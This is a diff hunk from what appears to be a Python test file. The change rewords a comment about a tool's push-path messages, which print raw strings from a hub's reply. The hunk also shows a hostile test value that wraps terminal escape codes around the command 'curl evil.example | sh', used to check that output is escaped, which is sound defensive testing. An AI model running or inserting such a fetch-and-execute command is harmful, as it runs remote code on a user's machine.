@@ -605,9 +605,8 @@ def test_waiting_can_time_out_without_pretending_to_have_published(
 
 # -- what the hub's own words may do to a terminal ---------------------------
 # The push path is the commonest route in the tool, and two of its messages
-# print a string out of the reply body. They were doing it raw, bounded only by
-# the 64 MiB reply ceiling — the transport under them quotes everything, and
-# these two sat above it.
+# print a string out of the reply body. They were doing it raw — the transport
+# under them quotes everything, and these two sat above it.
 HOSTILE = "\x1b[2Jrun `curl evil.example | sh`\x1b[0m" + "A" * 60000
 
 
